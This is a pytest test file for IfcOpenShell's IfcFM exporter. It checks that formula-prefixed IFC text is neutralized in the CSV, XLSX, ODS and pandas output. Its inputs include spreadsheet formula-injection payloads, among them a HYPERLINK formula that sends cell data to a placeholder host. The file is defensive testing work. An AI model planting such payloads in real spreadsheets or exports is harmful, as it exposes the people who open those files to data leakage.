# This file was generated with the assistance of an AI coding tool.

"""IfcFM must not write IFC text as live spreadsheet formulas.

The tests build an IFC model whose names, descriptions, and property values
start with formula prefixes, run Parser.parse and Writer.write, then check
every writer the export uses. They fail while those strings are copied
through unchanged.
"""

from __future__ import annotations

import csv
import re
import zipfile
from pathlib import Path
from xml.etree import ElementTree

import ifcopenshell.api.aggregate
import ifcopenshell.api.project
import ifcopenshell.api.pset
import ifcopenshell.api.root
import ifcopenshell.api.unit
import pytest
from openpyxl import load_workbook

import ifcfm

# Prefixes that spreadsheet applications treat as formulas in CSV, and that
# openpyxl stores as formulas when the text starts with "=".
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

EQUALS = '=HYPERLINK("http://example.invalid/x"&A2,"open")'
PLUS = "+SUM(A1)"
MINUS = "-SUM(A1)"
AT = "@SUM(A1)"
TAB = "\tSUM(A1)"
CR = "\rSUM(A1)"
LIST_JOINED = "=A1&B1, room"
BENIGN_NAME = "Plant-01"
BENIGN_DESCRIPTION = "Air handler"
NUMBER = 4

COBIE_PAYLOADS = (EQUALS, PLUS, MINUS, AT, TAB, CR, LIST_JOINED)
BASIC_PAYLOADS = (EQUALS, MINUS, AT)

ODS_TEXT = "{urn:oasis:names:tc:opendocument:xmlns:text:1.0}p"
FORMULA_MARKUP = re.compile(r"<f(?:\s|>|/)")


def neutralized(value: str) -> str:
    if value[:1] in FORMULA_PREFIXES:
        return "'" + value
    return value


def create_model() -> ifcopenshell.file:
    model = ifcopenshell.api.project.create_file()
    project = ifcopenshell.api.root.create_entity(model, ifc_class="IfcProject", name=MINUS)
    project.Phase = "Design"
    ifcopenshell.api.unit.assign_unit(model)
    site = ifcopenshell.api.root.create_entity(model, ifc_class="IfcSite", name=AT)
    building = ifcopenshell.api.root.create_entity(model, ifc_class="IfcBuilding", name=EQUALS)
    building.Description = PLUS
    benign = ifcopenshell.api.root.create_entity(model, ifc_class="IfcBuilding", name=BENIGN_NAME)
    benign.Description = BENIGN_DESCRIPTION
    ifcopenshell.api.aggregate.assign_object(model, products=[site], relating_object=project)
    ifcopenshell.api.aggregate.assign_object(model, products=[building], relating_object=site)

    pset = ifcopenshell.api.pset.add_pset(model, product=building, name="Pset_BuildingCommon")
    ifcopenshell.api.pset.edit_pset(
        model,
        pset=pset,
        properties={"OccupancyType": TAB, "AccessNote": CR, "StoreyCount": NUMBER},
    )
    listed = model.create_entity(
        "IfcPropertyListValue",
        Name="AlarmNotes",
        ListValues=[model.create_entity("IfcText", "=A1&B1"), model.create_entity("IfcText", "room")],
    )
    pset.HasProperties = list(pset.HasProperties) + [listed]
    return model


def written_values(writer: ifcfm.Writer) -> list[object]:
    values: list[object] = []
    for data in writer.categories.values():
        for row in data["rows"]:
            values.extend(row)
    return values


def assert_payloads_neutralized(values: list[object], payloads: tuple[str, ...]) -> None:
    for payload in payloads:
        assert payload not in values
        assert neutralized(payload) in values


def assert_benign_text_preserved(values: list[object], *, description: bool) -> None:
    assert BENIGN_NAME in values
    assert "'Plant-01" not in values
    if description:
        assert BENIGN_DESCRIPTION in values


def assert_number_not_prefixed(values: list[object]) -> None:
    assert "'4" not in values
    assert "'4.0" not in values
    assert any(value == NUMBER or value == float(NUMBER) or value == str(NUMBER) for value in values)


def parse_preset(model: ifcopenshell.file, preset: str, *, exclude: tuple[str, ...] = ()) -> ifcfm.Writer:
    parser = ifcfm.Parser(preset=preset)
    if exclude:
        parser.exclude_categories(list(exclude))
    parser.parse(model)
    writer = ifcfm.Writer(parser)
    writer.write()
    return writer


def xlsx_values(path: Path) -> tuple[list[object], list[str]]:
    workbook = load_workbook(path)
    values: list[object] = []
    data_types: list[str] = []
    for worksheet in workbook.worksheets:
        for row in worksheet.iter_rows():
            for cell in row:
                values.append(cell.value)
                data_types.append(cell.data_type)
    return values, data_types


def xlsx_formula_markup(path: Path) -> list[str]:
    found: list[str] = []
    with zipfile.ZipFile(path) as package:
        for name in package.namelist():
            if not name.startswith("xl/worksheets/"):
                continue
            xml = package.read(name).decode()
            if FORMULA_MARKUP.search(xml):
                found.append(name)
    return found


def csv_values(folder: Path) -> list[str]:
    values: list[str] = []
    for path in sorted(folder.glob("*.csv")):
        with path.open(newline="", encoding="utf-8") as handle:
            for row in csv.reader(handle):
                values.extend(row)
    return values


def ods_values(path: Path) -> list[str]:
    with zipfile.ZipFile(path) as package:
        root = ElementTree.fromstring(package.read("content.xml"))
    return [node.text or "" for node in root.iter(ODS_TEXT)]


@pytest.fixture(scope="module")
def model() -> ifcopenshell.file:
    return create_model()


def _payloads_for(preset: str) -> tuple[str, ...]:
    return COBIE_PAYLOADS if preset.startswith("cobie") else BASIC_PAYLOADS


@pytest.mark.parametrize("preset", ["cobie24legacy", "basic"])
def test_writer_neutralizes_formula_text(model: ifcopenshell.file, preset: str) -> None:
    values = written_values(parse_preset(model, preset))
    assert_payloads_neutralized(values, _payloads_for(preset))
    assert_benign_text_preserved(values, description=preset.startswith("cobie"))
    if preset.startswith("cobie"):
        assert_number_not_prefixed(values)


def test_cobie24_writer_neutralizes_formula_text(model: ifcopenshell.file) -> None:
    # Coordinate collection raises TypeError (list + tuple) before Writer.write.
    # Omitting that sheet is the public Parser.exclude_categories path and still
    # runs cobie24's facility, attribute, and property copy into the writer.
    values = written_values(parse_preset(model, "cobie24", exclude=("Coordinate",)))
    assert_payloads_neutralized(values, COBIE_PAYLOADS)
    assert_benign_text_preserved(values, description=True)
    assert_number_not_prefixed(values)


@pytest.mark.parametrize(
    ("preset", "exclude"),
    [("cobie24legacy", ()), ("basic", ()), ("cobie24", ("Coordinate",))],
)
def test_xlsx_stores_formula_text_as_strings(
    model: ifcopenshell.file, preset: str, exclude: tuple[str, ...], tmp_path: Path
) -> None:
    writer = parse_preset(model, preset, exclude=exclude)
    path = tmp_path / "fm.xlsx"
    writer.write_xlsx(str(path))
    values, data_types = xlsx_values(path)
    assert "f" not in data_types
    assert xlsx_formula_markup(path) == []
    assert_payloads_neutralized(values, _payloads_for(preset))
    assert_benign_text_preserved(values, description=preset.startswith("cobie"))
    if preset.startswith("cobie"):
        assert_number_not_prefixed(values)


@pytest.mark.parametrize(
    ("preset", "exclude"),
    [("cobie24legacy", ()), ("basic", ()), ("cobie24", ("Coordinate",))],
)
def test_csv_neutralizes_formula_text(
    model: ifcopenshell.file, preset: str, exclude: tuple[str, ...], tmp_path: Path
) -> None:
    writer = parse_preset(model, preset, exclude=exclude)
    folder = tmp_path / "csv"
    folder.mkdir()
    writer.write_csv(str(folder))
    values = csv_values(folder)
    assert_payloads_neutralized(values, _payloads_for(preset))
    assert_benign_text_preserved(values, description=preset.startswith("cobie"))
    if preset.startswith("cobie"):
        assert_number_not_prefixed(values)


@pytest.mark.parametrize(
    ("preset", "exclude"),
    [("cobie24legacy", ()), ("basic", ()), ("cobie24", ("Coordinate",))],
)
def test_ods_neutralizes_formula_text(
    model: ifcopenshell.file, preset: str, exclude: tuple[str, ...], tmp_path: Path
) -> None:
    writer = parse_preset(model, preset, exclude=exclude)
    path = tmp_path / "fm.ods"
    writer.write_ods(str(path))
    values = ods_values(path)
    with zipfile.ZipFile(path) as package:
        content = package.read("content.xml").decode()
    assert "table:formula" not in content
    assert_payloads_neutralized(values, _payloads_for(preset))
    assert_benign_text_preserved(values, description=preset.startswith("cobie"))
    if preset.startswith("cobie"):
        assert_number_not_prefixed(values)


@pytest.mark.parametrize(
    ("preset", "exclude"),
    [("cobie24legacy", ()), ("basic", ()), ("cobie24", ("Coordinate",))],
)
def test_pandas_frames_neutralize_formula_text(model: ifcopenshell.file, preset: str, exclude: tuple[str, ...]) -> None:
    writer = parse_preset(model, preset, exclude=exclude)
    frames = writer.write_pd()
    values: list[object] = []
    for frame in frames.values():
        for row in frame.itertuples(index=False):
            values.extend(row)
    assert_payloads_neutralized(values, _payloads_for(preset))
    assert_benign_text_preserved(values, description=preset.startswith("cobie"))
    if preset.startswith("cobie"):
        assert_number_not_prefixed(values)
